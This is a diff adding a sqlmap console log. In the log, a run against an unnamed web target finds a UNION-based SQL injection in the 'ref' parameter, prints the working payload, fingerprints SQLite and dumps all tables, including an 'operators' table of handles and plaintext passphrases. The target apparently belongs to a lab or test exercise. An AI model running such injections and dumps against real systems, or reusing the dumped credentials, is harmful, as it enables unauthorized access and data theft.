@@ -1,0 +1,121 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.11#pip}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:51:43 /2026-11-19/
+
+[22:51:43] [WARNING] using '/home/agent/sqlmap-output/dump20261119175142' as the output directory
+[22:51:43] [INFO] testing connection to the target URL
+[22:51:43] [INFO] checking if the target is protected by some kind of WAF/IPS
+[22:51:43] [INFO] testing if the target URL content is stable
+[22:51:43] [INFO] target URL content is stable
+[22:51:43] [WARNING] heuristic (basic) test shows that GET parameter 'ref' might not be SQL injectable
+[22:51:43] [INFO] testing for SQL injection on GET parameter 'ref'
+[22:51:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:51:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[22:51:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[22:51:44] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[22:51:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[22:51:44] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[22:51:44] [INFO] testing 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)'
+[22:51:44] [INFO] testing 'Generic inline queries'
+[22:51:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[22:51:44] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[22:51:44] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[22:51:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[22:51:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[22:51:44] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[22:51:44] [INFO] testing 'Oracle AND time-based blind'
+[22:51:49] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[22:51:49] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
+[22:51:49] [INFO] testing 'CUBRID AND time-based blind (SLEEP)'
+[22:51:49] [INFO] testing 'CUBRID OR time-based blind (SLEEP)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[22:51:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[22:51:49] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[22:51:49] [INFO] target URL appears to have 2 columns in query
+[22:51:49] [WARNING] applying generic concatenation (CONCAT)
+[22:51:49] [WARNING] reflective value(s) found and filtering out
+[22:51:49] [INFO] GET parameter 'ref' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
+[22:51:49] [INFO] checking if the injection point on GET parameter 'ref' is a false positive
+[22:51:54] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+GET parameter 'ref' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 107 HTTP(s) requests:
+---
+Parameter: ref (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: ref=1' UNION ALL SELECT NULL,CONCAT(CONCAT('qkzbq','xLgshzheqfjxegFwXnmtxbXONWdzLPYQIAWEFRNu'),'qvpjq')-- kLHJ
+---
+[22:51:54] [INFO] testing MySQL
+[22:51:54] [WARNING] the back-end DBMS is not MySQL
+[22:51:54] [INFO] testing Oracle
+[22:51:54] [WARNING] the back-end DBMS is not Oracle
+[22:51:54] [INFO] testing PostgreSQL
+[22:51:59] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[22:51:59] [WARNING] the back-end DBMS is not PostgreSQL
+[22:51:59] [INFO] testing Microsoft SQL Server
+[22:51:59] [WARNING] the back-end DBMS is not Microsoft SQL Server
+[22:51:59] [INFO] testing SQLite
+[22:51:59] [INFO] confirming SQLite
+[22:51:59] [INFO] actively fingerprinting SQLite
+[22:51:59] [INFO] the back-end DBMS is SQLite
+[22:51:59] [INFO] fetching banner
+back-end DBMS: SQLite
+banner: '3.46.1'
+[22:51:59] [WARNING] on SQLite it is not possible to enumerate the current user
+[22:51:59] [WARNING] on SQLite it is not possible to get name of the current database
+[22:51:59] [WARNING] on SQLite it is not possible to enumerate the hostname
+[22:51:59] [WARNING] on SQLite the current user has all privileges
+current user is DBA: True
+[22:51:59] [WARNING] on SQLite it is not possible to enumerate the users
+[22:51:59] [WARNING] on SQLite it is not possible to enumerate the user password hashes
+[22:51:59] [WARNING] on SQLite it is not possible to enumerate the user privileges
+[22:51:59] [WARNING] enumeration of roles is not supported on SQLite; sqlmap will enumerate privileges instead
+[22:51:59] [WARNING] on SQLite it is not possible to enumerate the user privileges
+[22:51:59] [INFO] sqlmap will dump entries of all tables from all databases now
+[22:51:59] [INFO] fetching tables for database: 'SQLite_masterdb'
+[22:51:59] [INFO] fetching columns for table 'operators' 
+[22:51:59] [INFO] fetching entries for table 'operators'
+Database: <current>
+Table: operators
+[5 entries]
++--------+----------------------------------+
+| handle | passphrase                       |
++--------+----------------------------------+
+| admin  | Q_KbdNZ3vupxgPsSAPtOe4pUJLT0Qi3K |
+| alice  | bgTj30A5ryJKtjxTe1ZSKW5MMuMsLnwq |
+| bob    | fII6XzRpBfKxDLpcplskXTC6LL3PZNGY |
+| carol  | bdTlJ1C4yzfN5veDce0bBQoxQaJ-U_7o |
+| dave   | UOW7rWt2DcfP4GrmL-mgKWV4T0sYFIT7 |
++--------+----------------------------------+
+
+[22:51:59] [INFO] table 'SQLite_masterdb.operators' dumped to CSV file '/home/agent/sqlmap-output/dump20261119175142/target/dump/SQLite_masterdb/operators.csv'
+[22:51:59] [INFO] fetching columns for table 'stock' 
+[22:51:59] [INFO] fetching entries for table 'stock'
+Database: <current>
+Table: stock
+[6 entries]
++----------+----------+
+| sku      | label    |
++----------+----------+
+| SKU-1001 | widget   |
+| SKU-1002 | gadget   |
+| SKU-1003 | sprocket |
+| SKU-1004 | flange   |
+| SKU-1005 | bracket  |
+| SKU-1006 | gasket   |
++----------+----------+
+
+[22:51:59] [INFO] table 'SQLite_masterdb.stock' dumped to CSV file '/home/agent/sqlmap-output/dump20261119175142/target/dump/SQLite_masterdb/stock.csv'
+[22:51:59] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 53 times
+[22:51:59] [INFO] fetched data logged to text files under '/home/agent/sqlmap-output/dump20261119175142/target'
+
+[*] ending @ 22:51:59 /2026-11-19/
+
